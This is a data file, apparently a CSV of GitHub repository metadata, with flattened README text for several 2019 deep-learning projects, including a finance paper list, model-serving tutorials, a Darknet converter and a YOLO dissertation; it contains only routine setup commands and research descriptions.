Leefinance,Quantitative-finance-papers-using-deep-learning,n/a,Quantitative finance papers using deep learning Background I would like to introduce some papers bridging deep learning and traditional financial theories especially in the field of investments hoping that the tecniques employed in them will be used as components in developing new investment and risk management systems Contents alt text Contents png 1 Financial data Tecnical indicators Forecasting price movements using technical indicators Investigating the impact of varying input window length 2017 Y Shynkevich et al pdf https www sciencedirect com science article pii S0925231217311074 Macroecnomic indicators An Algorithmic Crystal Ball Forecasts based on Machine Learning 2018 J K Jung et al pdf https www imf org en Publications WP Issues 2018 11 01 An Algorithmic Crystal Ball Forecasts based on Machine Learning 46288 Fundamental indicators Deep Learning for Predicting Asset Returns 2018 G Feng et al pdf https arxiv org pdf 1804 09314 pdf Focus It finds the existence of nonlinear factors which explain predictability of returns in particular at the extremes of the characteristic space Multi indicators Discovering Bayesian Market Views for Intelligent Asset Allocation 2018 F Z Xing et al pdf https arxiv org pdf 1802 09911 pdf Focus It proposes to formalize public mood into market views because market views can be integrated into the modern portfolio theory In the framework the optimal market views will maximize returns in each period with a Bayesian asset allocation model They use the data of capitalization prices volume and sentiment and train two neural models to generate the market views and benchmark the model performance on other popular asset allocation strategies Visual Attention Model for Cross sectional Stock Return Prediction and End to End Multimodal Market Representation Learning 2018 R Zhao et al pdf https arxiv org abs 1809 03684 Focus Using the data of price volume historical return technical indicators and fundamental indicators it applies a convolutional neural network over this market image to build market features in a hierarchical way We use a recurrent neural network with an attention mechanism over the market feature maps to model temporal dynamics in the market 2 Deep neural networks 2 1 Multi layer perceptron 2 2 Recurrent neural networks simple RNN LSTM GRU Deep learning with long short term memory networks for financial market predictions 2018 T Fischer and C Krauss https www sciencedirect com science article abs pii S0377221717310652 2 3 Convolutional neural networks Algorithmic financial trading with deep convolutional neuralnetworks Time series to image conversion approach 2018 O B Sezer and A M Ozbayoglu https www sciencedirect com science article pii S1568494618302151 Focus It proposes a novel algorithmic trading model CNN TA using a 2 D convolutional neural network based on image processing properties In order to convert financial time series into 2 D images 15 different technical indicators each with different parameter selections are utilized 2 4 Autoencoder 3 Optimization A note on the validity of cross validation for evaluating autoregressive time series prediction 2018 Bergmeir et al 4 Financial use cases 4 1 Prediction up down trend 4 2 Deep trading 4 3 Deep portfolio deep factor Applying Deep Learning to Enhance Momentum Trading Strategies in Stocks 2013 L Takeuchi and Y Y Lee pdf http cs229 stanford edu proj2013 TakeuchiLee ApplyingDeepLearningToEnhanceMomentumTradingStrategiesInStocks pdf Focus It uses an autoencoder composed of stacked restricted Boltzmann machines to extract features from the history of individual stock prices Its model is able to discover an enhanced version of the momentum effect in stocks without extensive hand engineering of input features Deep learning with long short term memory networks for financial market predictions 2018 T Fischer and C Krauss https www sciencedirect com science article abs pii S0377221717310652 Deep Learning in Asset Pricing 2019 L Chen et al pdf https economics yale edu sites default files deeplearninginassetpricing pdf Deep Factor Model 2018 K Nakagawa et al pdf https arxiv org pdf 1810 01278 pdf Focus It proposes to represent a return model and risk model in a unified manner with deep learning which is a representative model that can express a nonlinear relationship Deep Learning in Asset Pricing 2019 G Feng et al pdf https arxiv org pdf 1805 01104 pdf Deep Recurrent Factor Model Interpretable Non Linear and Time Varying Multi Factor Model 2019 K Nakagawa et al pdf https arxiv org ftp arxiv papers 1901 1901 11493 pdf Deep Learning Approximation for Stochastic Control Problems 2016 J Han and Weinan E pdf https arxiv org pdf 1611 07422 pdf Focus It develops a deep learning approach that directly solves high dimensional stochastic control problems based on Monte Carlo sampling and test this approach using examples from the areas of optimal trading Machine learning and the cross section of expected stock returns 2018 M Messmer pdf http www1 unisg ch www edis nsf SysLkpByIdentifier 4816 FILE dis4816 pdf Focus Modeling expected cross sectional stock returns has a long tradition in asset pricing It is motivated by shortcomings of classical portfolio sorting approaches and tackles the task with alternative methodologies including classical linear models and more advanced machine learning algorithms Empirical Asset Pricing via Machine Learning 2019 S Gu et al pdf http dachxiu chicagobooth edu download ML pdf Focus It performs a comparative analysis of machine learning methods for the canonical problem of empirical asset pricing measuring asset risk premia Improved risk premium measurement through machine learning simplifies the investigation into economic mechanisms of asset pricing and highlights the value of machine learning in financial innovation Machine Learning and Asset Pricing Models PhD Thesis 2018 R A Porsani pdf https escholarship org uc item 124940r0 Focus It incorporates statistical learning techniques into the field of cross sectional asset pricing Deep Fundamental Factor Models 2019 M F Dixon and N G Polson pdf https arxiv org pdf 1903 07677 pdf Focus It develops deep fundamental factor models to interpret and capture non linearity interaction effects and non parametric shocks in financial econometrics by constructing a six factor model of assets in the S P 500 index and generating information ratios that are three times greater than generalized linear regression Deep Learning for Forecasting Stock Returns in the Cross Section 2018 Masaya Abe and Hideki Nakayama pdf https arxiv org ftp arxiv papers 1801 1801 01777 pdf Focus It implements deep learning to predict one month ahead stock returns in the cross section in the Japanese stock market and investigates the performance of the method Improving Factor Based Quantitative Investing by Forecasting Company Fundamentals 2018 J Alberg and Z C Lipton pdf https arxiv org pdf 1711 04837 pdf Focus They first show through simulation that if they could clairvoyantly select stocks using factors calculated on future fundamentals via oracle then their portfolios would far outperform a standard factor approach 4 4 Deep Reinforcement Deep Reinforcement Learning in Financial Markets 2019 S Chakraborty pdf https arxiv org abs 1907 04373 Focus It explores the usage of deep reinforcement learning algorithms to automatically generate consistently profitable robust uncorrelated trading signals in any general financial market and develops a novel Markov decision process MDP model to capture the financial trading markets 5 Explaining machine learning A Unified Approach to Interpreting Model Predictions 2017 S M Lundberg and S I Lee pdf https papers nips cc paper 7062 a unified approach to interpreting model predictions pdf Focus It presents a unified framework for interpreting predictions SHAP SHapley Additive exPlanations SHAP assigns each feature an importance value for a particular prediction 6 Industrial application J P Morgan Artificial Intelligence J P Morgan J P Morgan s massive guide to machine learning and big data jobs in finance J B Heaton Quantitative investing and the limits of deep learning from financial data pdf https papers ssrn com sol3 papers cfm abstractid 3133110 7 Survey Natural language based financial forecasting a survey 2018 F Z Xing et al pdf https link springer com article 10 1007 s10462 017 9588 9 Focus It clarifies the scope of natural language based financial forecasting NLFF research by ordering and structuring techniques and applications from related work Surveying stock market forecasting techniques Part II Soft computing methods 2009 G S Atsalakis et al pdf https www sciencedirect com science article pii S0957417408004417 Focus It surveys more than 100 related published articles that focus on neural and neuro fuzzy techniques derived and applied to forecast stock markets Computational Intelligence and Financial Markets A Survey and Future Directions 2016 R C Cavalcante et al pdf https www sciencedirect com science article pii S095741741630029X Focus It gives an overview of the most important primary studies published from 2009 to 2015 which cover techniques for preprocessing and clustering of financial data for forecasting future market movements for mining financial text information among others,2019-08-22T13:16:08Z,2019-12-14T15:55:00Z,n/a,Leefinance,User,1,4,2,54,master,Leefinance,1,0,0,0,0,0,0
RodolfoFerro,RIIAA19-DLaaS,n/a,DLaaS media banner png GitHub last commit https img shields io github last commit RodolfoFerro RIIAA19 DLaaS style for the badge GitHub repo size https img shields io github repo size RodolfoFerro RIIAA19 DLaaS style for the badge GitHub https img shields io github license RodolfoFerro RIIAA19 DLaaS style for the badge Slides https img shields io static v1 label Slides message Google 20Slides color tomato style for the badge https docs google com presentation d e 2PACX 1vQu3NcX5En0X4fd65 jziWHvPmkU1tUNQurw3lAgfcEHNwtmsaLg4zrE5AKwkYb0cshCXM0p55Is47p pub start false loop false delayms 3000 Contenido del taller El taller fue desarrollado exclusivamente para su uso durante la Escuela de Verano de la RIIAA 2 0 y debe estar autocontenido lo que significa que con este documento explicativo debe bastar para poder seguir y desarrollar el contenido del taller Grosso modo el contenido cubierto a lo largo del taller es el siguiente Motivacin 0 2 hrs Requisitos y setup 0 4 hrs Intro al mundo del Deep Learning 1 5 hrs Funcionamiento de APIs 2 5 hrs Requests Consumo de APIs con Python Flask Microframework web de Python Cmo servimos modelos de IA 4 hrs Puedes encontrar los slides en vivo AQU https docs google com presentation d e 2PACX 1vQu3NcX5En0X4fd65 jziWHvPmkU1tUNQurw3lAgfcEHNwtmsaLg4zrE5AKwkYb0cshCXM0p55Is47p pub start false loop false delayms 3000 Es importante mencionar que el curso har uso de un ambiente en la nube y uno local para el desarrollo del material por lo que te recomendamos apoyarte de los ayudantes del curso para la instalacin de Pythony todos los requerimientos Instrucciones para estudiantes La mayora de las prcticas de los talleres se desarrollarn en Python 3 7 usando la biblioteca Tensorflow 2 0 https www tensorflow org que adopta Keras https www tensorflow org versions r2 0 apidocs python tf keras como interfaz de alto nivel para construir y entrenar redes neuronales Requerimientos Una laptop Este repositorio de GitHub clonado y actualizado antes del taller Un sentido aventurero en los datos Un ambiente Python 3 7 con Anaconda ver opciones 1 y 2 abajo Los talleres sern impartidos usando notebooks de Jupyter documentos con cdigo ejecutable texto ecuaciones visualizaciones imgenes y dems material Los notebooks se pueden crear y ejecutar en la nube va Google Colab opcin 1 o de manera local en tu computadora a travs de Jupyter Notebooks o JupyterLab https jupyter org opcin 2 Opcion 1 Google Colab Colab https colab research google com es un servicio de Google para ejecutar notebooks en la nube Provee ambientes de Python 2 y 3 con CPUs GPUs y TPUs Y es gratis Solo necesitas tener una cuenta de Google o crear una Recomendamos que elijas un ambiente con Python 3 y GPU Para activarlo Abre el men Entorno de ejecucin Elige la opcin Restablecer todos los entornos de ejecucin Vuelve a abrir Entorno de ejecucin Elige Cambiar tipo de entorno de ejecucin Selecciona Python 3 como Tipo de ejecucin y GPU de la lista de Acelerador por hardware La siguiente captura de pantalla ilustra este proceso media escogeacelerador png En Colab https colab research google com puedes crear un nuevo notebook subir uno existente desde tu computadora o importarlo de Google Drive o GitHub Opcion 2 Ambiente local Para tener la versin de Python 3 7 aadido Python al PATH y todas las bibliotecas instaladas en cualquier plataforma recomendamos que uses Anaconda https www anaconda com y generes un ambiente con el archivo environment yml de este repositorio usando una terminal y el comando bash conda env create n riiaa19 f environment yml Cambia el nombre riia19 por tu nombre favorito para el ambiente o puedes remover la bandera n riia19 para dejar el nombre default del ambiente DLaaS Para activar el ambiente que creaste en una terminal ingresa el comando bash conda activate riiaa19 O en su defecto conda activate DLaaS Una vez activado puedes ejecutar la aplicacin de Jupyter Notebook bash jupyter notebook O de JupyterLab bash jupyter lab Este ltimo comando abrir una pestaa o ventana en tu navegador web como se muestra en la siguiente captura de pantalla media jupyterlab png Al igual que en Google Colab puedes crear un nuevo notebook seleccionando el botn New y posteriormente Python 3 De forma alternativa puedes abrir uno existente seleccionando el archivo del notebook con extensin ipynb dentro del directorio donde ejecutaste Jupyter Notebook Con el botn Upload agregas archivos que se encuentran en otra parte de tu computadora a este directorio Para cerrar Jupyter Notebook presiona el botn Quit y posteriormente cierra la pestaa o ventana de tu navegador web Para desactivar el ambiente riiaa19 de Anaconda simplemente haz conda deactivate Atribuciones Este repositorio cuenta con una MIT License https github com RodolfoFerro RIIAA19 DLaaS blob master LICENSE Los conos creados por DinosoftLabs https www flaticon com authors dinosoftlabs y Flat Icons https www flaticon com authors flat icons de cuentan con una licencia CC 3 0 BY http creativecommons org licenses by 3 0,2019-08-27T08:18:18Z,2019-09-17T21:03:47Z,Jupyter Notebook,RodolfoFerro,User,1,4,3,19,master,RodolfoFerro,1,0,0,0,0,0,0
Eshan-Agarwal,DeepLearning.ai_Assigments,n/a,DeepLearning aiAssigments Complete Assignments of Andrew NG course,2019-08-16T18:37:09Z,2019-10-22T18:55:20Z,Jupyter Notebook,Eshan-Agarwal,User,1,4,0,5,master,Eshan-Agarwal,1,0,0,0,0,0,0
marlesson,NLP-DeepLearningBrasil-Aula2,machine-learning#nlp,,2019-09-11T16:28:38Z,2019-09-13T16:25:31Z,Jupyter Notebook,marlesson,User,3,4,0,1,master,marlesson,1,0,0,0,0,0,0
WayneDW,Bayesian-Sparse-Deep-Learning,n/a,Bayesian Sparse Deep Learning Experiment code for An Adaptive Empirical Bayesian Method for Sparse Deep Learning https arxiv org pdf 1910 10791 pdf We propose a novel adaptive empirical Bayesian method to efficiently train hierarchical Bayesian mixture DNN models where the parameters are learned through sampling while the priors are learned through optimization In addition this model can be further generalized to a class of adaptive sampling algorithms for estimating various state space models in deep learning inproceedingsdeng2019 title An Adaptive Empirical Bayesian Method for Sparse Deep Learning author Wei Deng and Xiao Zhang and Faming Liang and Guang Lin booktitle Advances in Neural Information Processing Systems year 2019 Large p small n Linear Regression GitHub Logo figures lrsimulation png Regression UCI dataset Requirement PyTorch 1 01 https pytorch org Python 2 7 numpy sklearn Since the model is simple GPU environment doesn t give you significant computational accelerations Therefore we use CPU instead The followings are the commands to run the different methods stochastic approximation SGHMC EM SGHMC vanilla SGHMC on the Boston housing price https www kaggle com vikrishnan boston house prices dataset python python ucirun py data boston c sa invT 1 v0 0 1 anneal 1 003 seed 5 python ucirun py data boston c em invT 1 v0 0 1 anneal 1 003 seed 5 python ucirun py data boston c sghmc invT 1 v0 0 1 anneal 1 003 seed 5 You can also use the other datasets to test the performance e g yacht energy efficiency wine and concrete To obtain a comprehensive evaluation you may need to try many different seeds Classification MNIST Fashion MNIST You can adjust the posteriorcnn py and use the model in model modelzoomnist py 99 7x results on MNIST dataset can be easily obtained with the hyperparameters most importantly temperature in the paper To run the Adversarial examples you can include the file in tools attacker py and make the corresponding changes Classification Sparse Residual Network on CIFAR10 Requirement Python 2 7 PyTorch 1 01 https pytorch org numpy CUDA Pretrain a dense model python python bayescnn py lr 2e 6 invT 20000 save 1 prune 0 Finetune a sparse model through stochastic approximation python python bayescnn py lr 2e 9 invT 1000 anneal 1 005 v0 0 005 v1 1e 5 sparse 0 9 c sa prune 1 The default code can produce a 90 sparsity Resnet20 model with the state of the art 91 56 accuracy PyTorch version 1 01 based on 27K parameters by contrast EM based SGHMC with step size 1 and vanilla SGHMC algorithm with step size 0 obtain much worse results The running log based on the default seed is saved in the output folder you can try other seeds to obtain higher results For other sparse rates one needs to tune the best v0 and v1 parameters e g 30 0 5 1e 3 50 0 1 5e 4 70 0 1 5e 5 to achive the state of the art References Wei Deng Xiao Zhang Faming Liang Guang Lin An Adaptive Empirical Bayesian Method for Sparse Deep Learning https arxiv org pdf 1910 10791 pdf NeurIPS 2019,2019-09-04T01:31:37Z,2019-12-13T05:54:21Z,Python,WayneDW,User,2,4,0,2,master,WayneDW#waynedwdw,2,0,0,0,0,0,3
cuixing158,DeepLearning-Converter-for-Darknet-Matlab-Model-Format,n/a,RUNOOB https github com cuixing158 DeepLearning Converter for Darknet Model Format blob master imagesResult importerExporter png Darknet Importer and Exporter The importer can import all the seriesNetworks in the darknet and some simple DAGnetworks The exporter can export all the seriesNetworks and some of the backbone networks In addition to importing the deep neural network the importer can obtain the feature map size of the network the number of parameters and the computational power FLOPs For yolov2 yolov3 can also import a number of previous modules for later access to the yolo layer This repositories requires Matlab2019a version and above no other dependencies darknet https github com pjreddie darknet resnet yolo alexnet cfg cifar cfg darknet cfg darknet19 cfg darknet19448 cfg darknet53 cfg darknet9000 cfg densenet201 cfg extraction cfg extraction conv cfg extraction22k cfg tiny cfg tiny cfg FLOPs 1 https pjreddie com darknet imagenet PreTrained Modelsdarknet19 cfgfile darknet19 cfg weightfile darknet19 weights mynet hyperParams numsNetParams FLOPs importDarknetNetwork cfgfile weightfile RUNOOB https github com cuixing158 DeepLearning Converter for Darknet Model Format blob master imagesResult importDarknetNetwork png analyzeNetwork mynet RUNOOB https github com cuixing158 DeepLearning Converter for Darknet Model Format blob master imagesResult mynet png classesNames fid fopen imagenetshortnameslist txt r cls textscan fid s Delimiter n classesNames cls1 fclose fid top5 img imread peppers png inputsize mynet Layers 1 InputSize img im2single imresize img inputsize 1 2 scores predict mynet img rankk 5 maxscores ids maxk scores rankk 2 for i 1 rankk predictLabel classesNamesids i predictScore maxscores i fprintf top d predictLabel 20s predictScore 2fn i predictLabel predictScore end RUNOOB https github com cuixing158 DeepLearning Converter for Darknet Model Format blob master imagesResult recresult png 2 cutoffModule 15 lgraphWeight hyperParams numsNetParams FLOPs importDarknetWeights cfgfile weightfile cutoffModule analyzeNetwork lgraphWeight RUNOOB https github com cuixing158 DeepLearning Converter for Darknet Model Format blob master imagesResult importDarknetWeights png RUNOOB https github com cuixing158 DeepLearning Converter for Darknet Model Format blob master imagesResult lgraphWeight png 3mynetcfg weights hyperParams if isempty hyperParams hyperParams struct batch 64 subdivisiions 1 height mynet Layers 1 InputSize 1 width mynet Layers 1 InputSize 2 channels mynet Layers 1 InputSize 3 momentum 0 9 maxcrop 256 learningrate 0 01 policy poly power 4 maxbatches 600000 angle 7 saturation 0 75 exposure 0 75 aspect 0 75 end cfgfile exportC cfg weightfile exportW weights exportDarkNetNetwork mynet hyperParams cfgfile weightfile 4 yolov3 tiny cfg https github com pjreddie darknet blob master cfg yolov3 tiny cfg cfgfile yolov3 tiny cfg cutoffModule 17 lgraphLayer hyperParams numsNetParams FLOPs moduleTypeList moduleInfoList layerToModuleIndex importDarkNetLayers cfgfile cutoffModule analyzeNetwork lgraphLayer RUNOOB https github com cuixing158 DeepLearning Converter for Darknet Model Format blob master imagesResult importDarknetLayers png RUNOOB https github com cuixing158 DeepLearning Converter for Darknet Model Format blob master imagesResult lgraphLayer png 5mobilenetV2 mobilenetv2 https github com cuixing158 pytorch mobilenet v2 pytorch pytorchonnx python net MobileNetV2 nclass 1000 statedict torch load r mobilenetv2 pth tar net loadstatedict statedict torch onnx export net torch randn 1 3 224 224 mobilenetv2pytorch onnx verbose True mobilenetv2pytorch onnxmatlab importONNXLayers https www mathworks com help deeplearning ref importonnxlayers html deepNetworkDesigner matlab onnxf mobilenetv2pytorch onnx lgraph importONNXLayers onnxf OutputLayerType classification ImportWeights true placeholderLayers findPlaceholderLayers lgraph revLayers string vertcat placeholderLayers Name lgraph removeLayers lgraph revLayers deepNetworkDesigner onnxm2 mat https pan baidu com s 1i0NBPd9CzhyfC0m7t7Ri6w axnv isLoadOnnxtruefalsecfg weightsOK matlab classes getClasses synsetwords txt isLoadOnnx true mobilenetv2cfg m2export cfg mobilenetv2weight m2export weights if isLoadOnnx load m2 mat else matlab netCNN hyperParams numsNetParams FLOPs importDarknetNetwork mobilenetv2cfg mobilenetv2weight end sz netCNN Layers 1 InputSize image imread peppers png image im2single imresize image sz 1 2 mean 0 485 0 456 0 406 std 0 229 0 224 0 225 image 1 image 1 mean 1 std 1 image 2 image 2 mean 2 std 2 image 3 image 3 mean 3 std 3 predict Ypredict predict netCNN image maxval ind max Ypredict predictLabel classes ind predictScore maxval str sprintf predictLabel s predictScore 5fn string predictLabel string predictScore fprintf s str 0 7757 mynet netCNN hyperParams if isempty hyperParams hyperParams struct batch 64 subdivisiions 1 height mynet Layers 1 InputSize 1 width mynet Layers 1 InputSize 2 channels mynet Layers 1 InputSize 3 momentum 0 9 maxcrop 256 learningrate 0 01 policy poly power 4 maxbatches 600000 angle 7 saturation 0 75 exposure 0 75 aspect 0 75 end exportDarkNetNetwork mynet hyperParams mobilenetv2cfg mobilenetv2weight predictLabel n07720875 bell pepper predictScore 0 77573,2019-08-24T08:06:23Z,2019-11-12T02:04:53Z,MATLAB,cuixing158,User,1,4,0,25,master,cuixing158,1,0,0,0,0,0,0
juanitorduz,math_deep_learning_summer_school19,n/a,BMS https www math berlin de Summer School 2019 Mathematics of Deep Learning BERLIN 19 30 August 2019 at Zuse Institute Berlin This repository contains material of the BMS Summer School Mathematics of Deep Learning https www math berlin de Conda Environment Create conda environment https docs conda io projects conda en latest user guide tasks manage environments html conda env create f environment yml Activate conda environment conda activate bmssummer19 Run Jupyter Lab https jupyterlab readthedocs io en stable index html jupyter lab Public Material References Mathematics of Deep Learning https arxiv org abs 1712 04741 Rene Vidal http cis jhu edu rvidal Joan Bruna Raja Giryes Stefano Soatto Eldad Haber https eldad haber webnode com University of British Columbia Using PDEs for designing stable DNN architectures Slides PyTorch Code Repository https github com eldadHaber CompAI Other References Neural Networks Tricks of the Trade Reloaded https www springer com gp book 9783642352881 G Montavon G B Orr K Mller Eds TensorFlow 2 0 Tutorial During the summer school we are having hands on practive on TensorFlow https www tensorflow org The material can be found on the GitHub repository https github com clonker bms summerschool19 tf https github com clonker bms summerschool19 tf REMARK Most of the experiments in this repository are based on the tutorial mentioned above I extended some parts for my personal clarification,2019-08-17T13:00:51Z,2019-11-12T15:43:49Z,Jupyter Notebook,juanitorduz,User,1,4,1,17,master,juanitorduz,1,0,0,0,0,0,0
marcogdepinto,Deep-learning-model-deploy-with-django,api#api-rest#artificial-intelligence#artificial-neural-networks#deep-learning#deep-neural-networks#django#django-application#django-framework#django-rest-framework#keras#keras-models#keras-neural-networks#keras-tensorflow#python#python-3#python3,Deep learning model deploy with Django made with python https img shields io badge Made 20with Python 1f425f svg https www python org This repository includes a Django based API to serve a deep learning model previously trained A simple front end is provided to give non power users the possibility to interact via UI The model used is an Emotion Classifier trained with audio files of the RAVDESS dataset More info here https github com marcogdepinto Emotion Classification Ravdess Why I am doing this The vision of this project is to show that artificial intelligence applications can be shipped to production consumed by users and have a real impact This is just a research project but hope it can inspire someone to build something big How does this work User Journey The user journey start on the index page at index where it is possible to choose if 1 Upload a new file on the server 2 Delete a file from the server WIP 3 Make a prediction on a file already on the server Picture1 https github com marcogdepinto Django Emotion Classification Ravdess API blob master gitmedia index png Choosing Upload your audio file the user will be redirected to a modified home page The user will be asked to pick a file from his computer The UI will confirm if the operation has been successful Picture2 https github com marcogdepinto Django Emotion Classification Ravdess API blob master gitmedia fileuploadv2 png Choosing Make your prediction the user will be redirected to a modified home page In this page it will be possible to see a list of the files already on the server Following the path media filename it will be also possible to listen to the audio file Picture3 https github com marcogdepinto Django Emotion Classification Ravdess API blob master gitmedia fileselectionv2 png After clicking on Submit the user will be redirected to a modified home page that will include the prediction made by the Keras model for the file selected Picture4 https github com marcogdepinto Django Emotion Classification Ravdess API blob master gitmedia predict png See the App in action There is a short demo of the first version on YouTube https youtu be 86HhxTRL3c The UI has been updated since then as now manages all the actions extending the index templates with the action templates The above pictures are updated with the new workflow Developers stuff How to start the server and try it 1 git clone https github com marcogdepinto Django Emotion Classification Ravdess API git 2 pip install r requirements txt 3 Open a terminal window cd into the project folder and run python manage py runserver How to run the tests python manage py test Other important topics The Keras model is stored in the models folder gitmedia folder includes the pictures used for this README media folder includes the audio files loaded using the server If you do not know how Django works you can skip to the App views py file to review the high level logic of the API User Stories What is the plan for the future and what it is currently ongoing https github com marcogdepinto Django Emotion Classification Ravdess API projects 2,2019-08-09T16:45:16Z,2019-12-14T16:46:31Z,Python,marcogdepinto,User,1,4,0,73,master,marcogdepinto#dependabot[bot],2,3,3,0,2,0,4
kheyer,Deep-Synthesis,n/a,Deep Synthesis Deep Synthesis is a deep learning driven application for predicting the products of an organic chemical reaction Deep Synthesis runs a deep learning machine translation model inspired by Schwaller et al https arxiv org abs 1811 02633 that takes as input the SMILES string representation of chemcal reactants and translates them to the SMILES strings of the products Deep Synthesis allows chemists and chemistry enthusiasts to experiment with reactions in silico Deep Synthesis is running online at deepsynthesis xyz http deepsynthesis xyz Repository Structure Deep Synthesis Synthesis Main program files buildaws Instructions for AWS setup buildlocal Instructions for local setup configs data Small sample datasets media train Code for retraining the model Main application files are stored in the Synthesis directory Code and instructions for setup on AWS are contained in the buildaws directory Code and instructions for local setup are contained in the buildlocal directory Code for retraining the model assuming a local install is contained in the train directory How to Install The Deep Synthesis repo supports local installation and setup on AWS Local Setup Deep Synthesis can easily be set up on your local machine either as a Docker container or a conda environment Local setup is best if you want to run bulk predictions or tinker with the app Local setup supports bulk prediction from a text file of SMILES string either through the app GUI or a command line interface The quickest way to get up and running is to install Deep Synthesis using Docker If you do not have Docker installed follow the Docker Download Instructions https docs docker com install Then run the following commands git clone https github com kheyer Deep Synthesis cd Deep Synthesis docker build f buildlocal local Dockerfile t deepsynthesis docker run d p 8501 8501 deepsynthesis Deep Synthesis is now running locally on port 8501 For additional local installation instructions see the README of the buildlocal directory link https github com kheyer Deep Synthesis tree master buildlocal The buildlocal README details how to set up Deep Synthesis as a Conda environment as an alternative to Docker how to run bulk predictions on your local install and how to run predictions from the command line AWS Setup For a more scalable setup Deep Synthesis can be run on AWS We can set up a Kubernetes cluster on AWS to host the front end of the application and a AWS Lambda function to handle inference This is the framework being used to host the application at deepsynthesis xyz http deepsynthesis xyz For full details on setting up Kubernetes and AWS Lambda see the buildaws directory link https github com kheyer Deep Synthesis tree master buildaws Note that AWS setup is much more involved than local setup and requires an AWS IAM account with permissions for EKS EC2 and Lambda Online Web App Deep Synthesis is running online at deepsynthesis xyz http deepsynthesis xyz Using the web app is great if you want to play with the model or run a small number of predictions Input your SMILES string into the text box or choose one of the examples in the drop down menu on the left Clicking the Predict Products button generates a set of predicted reaction products Predictions can be further inspected by looking at attention maps between reactant and predicted product strings Model Details The model used is a sequence to sequence transformer model implemented in OpenNMT https github com kheyer OpenNMT py This model takes as input the SMILES string representation of reactants and translates them to the SMILES of the product molecule This method was originally developed by Schwaller et al https arxiv org abs 1811 02633 Their work is available at the Molecular Transformer Repo https github com pschwllr MolecularTransformer Compared to Schwaller the model shown here was trained from scratch in Pytorch 1 1 0 using the expanded Patent Reaction Dataset https depth first com articles 2019 01 28 the nextmove patent reaction dataset The new model also uses character level tokenization which reduces model size and removes the need for the chemically constrained beam search procedure used by Schwaller Project Slides For more details on the project see the presentation slides https docs google com presentation d 1YdgaQKAF6Aw3qw0qi9z3Ze6R71vwK7Lpk5uczrCd2zM edit slide id g64612c95ea00,2019-09-16T22:52:16Z,2019-12-11T06:25:16Z,Python,kheyer,User,1,4,0,144,master,kheyer,1,0,0,0,0,0,5
geonm,tf_uniform_loss,n/a,UniformFace Learning Deep Equidistributed Representation for Face Recognition Tensorflow Implementation of UniformFace Learning Deep Equidistributed Representation for Face Recognition ref http openaccess thecvf com contentCVPR2019 papers DuanUniformFaceLearningDeepEquidistributedRepresentationforFaceRecognitionCVPR2019paper pdf I only uploaded the uniform loss Now I m testing Reference InProceedingsDuan2019CVPR author Duan Yueqi and Lu Jiwen and Zhou Jie title UniformFace Learning Deep Equidistributed Representation for Face Recognition booktitle The IEEE Conference on Computer Vision and Pattern Recognition CVPR month June year 2019,2019-08-12T09:33:05Z,2019-12-03T23:16:34Z,Python,geonm,User,2,4,2,4,master,geonm,1,0,0,1,0,0,0
ldkong1205,MSc-Dissertation,n/a,MSc Dissertation Start from 13 Aug 2019 Last update at 29 Aug 2019 Project Title Computational Imaging and Detection via Deep Learning Project Summary Data driven signal and data modeling has received much attention recently for its promising performance in image processing computer vision imaging etc Among many machine learning techniques the popular deep learning has demonstrated promising performance in image related applications However it is still unclear whether it can be applied to benefit various computational imaging and vision applicartions ranging from image restoration to analysis This project aims to develop efficient and effective deep learning algorithms for computational imaging and detection applications Keywords Deep Learning Object Detection X Ray Image References Caijing Miao Lingxi Xie Fang Wan Chi Su Hongye Liu Jianbin Jiao Qixiang Ye SIXray A Large scale Security Inspection X ray Benchmark for Prohibited Item Discovery in Overlapping Images arXiv https arxiv org abs 1901 00303v1 Joseph Redmon Santosh Divvala Ross Girshick Ali Farhadi You Only Look Once Unified Real Time Object Detection arXiv https arxiv org abs 1506 02640 Joseph Redmon Ali Farhadi YOLO9000 Better Faster Stronger arXiv https arxiv org abs 1612 08242 Joseph Redmon Ali Farhadi YOLOv3 An Incremental Improvement arXiv https arxiv org abs 1804 02767 Shaoqing Ren Kaiming He Ross Girshick Jian Sun Faster R CNN Towards Real Time Object Detection with Region Proposal Networks arXiv https arxiv org abs 1506 01497 Progress I YOLOv3 Some tutorials about YOLOv3 can be found at Tutorial 1 https medium com viirya yolo a very simple tutorial 8d573a303480 Tutorial 2 https blog csdn net guleileo article details 80581858 and Tutorial 3 https blog csdn net m037192554 article details 81092514 The installation and configuration of YOLOv3 have been completed and preliminary test has been carried out Details of the installation and configuration can be found at YOLOv3 https pjreddie com darknet yolo and YOLOv3 for Mac https bbs csdn net topics 392556090 list lz image https github com ldkong1205 MSc Dissertation blob master IMAGE predictions2 jpg image https github com ldkong1205 MSc Dissertation blob master IMAGE predictions 201 jpg image https github com ldkong1205 MSc Dissertation blob master IMAGE predictions jpg Important codes Activating the detection for multiple images use Ctrl C to exit python darknet detect cfg yolov3 cfg yolov3 weights Changing the detection threshold python darknet detect cfg yolov3 cfg yolov3 weights data dog jpg thresh 0 25 II Some Notes about YOLO YOLOv2 and YOLOv3 a Objective Object detection and confidence evaluation with one stage different from region proposal based two stage approaches which require selective search and regression b Fundamental of CNN Why CNN for image 3 reasons Property 1 Some patterns are much smaller than the whole image The neuron doesn t have to see the whole image to discover the pattern Also connecting to small region requires less parameters Property 2 The same patterns appear in different regions Property 3 Subsampling the pixels will not change the objects patterns Convolution Convolution v s Fully Connected Network image https github com ldkong1205 MSc Dissertation blob master IMAGE cnn png image https github com ldkong1205 MSc Dissertation blob master IMAGE cnn v s fullyconnected png Max Pooling image https github com ldkong1205 MSc Dissertation blob master IMAGE pooling png image https github com ldkong1205 MSc Dissertation blob master IMAGE maxpooling png c The Concept of YOLO The YOLO s detection system 3 steps image https github com ldkong1205 MSc Dissertation blob master IMAGE YOLO detection system png Step 1 Resize the image to 448x448 Step 2 Run a single CNN on the image Step 3 Threshold the resulting detections by the model s confidence The grid division The system divides the image into an S x S grid If the center of an object falls into a grid cell that grid cell is responsible for detecting that object Each grid cell predicts B bounding boxes and confidence scores for those boxes These confidence scores reflect how confident the model is that the box contains an object and also how accurate it thinks the box is that it predicts Otherwise we want the confidence score to equal the intersection over union IOU between the predicted box and the ground truth Each bounding box consists of 5 predictions x y w h and confidence The x y coordinates represent the center of the box relative to the bounds of the grid cell The width and height are predicted relative to the whole image Finally the confidence prediction represents the IOU between the predicted box and any ground truth box Each grid cell also predicts C conditional class probabilities Pr Classi Object These probabilities are conditioned on the grid cell containing an object image https github com ldkong1205 MSc Dissertation blob master IMAGE YOLO model png,2019-08-14T01:09:19Z,2019-10-14T13:27:03Z,Python,ldkong1205,User,1,4,0,244,master,ldkong1205,1,0,0,0,0,0,1
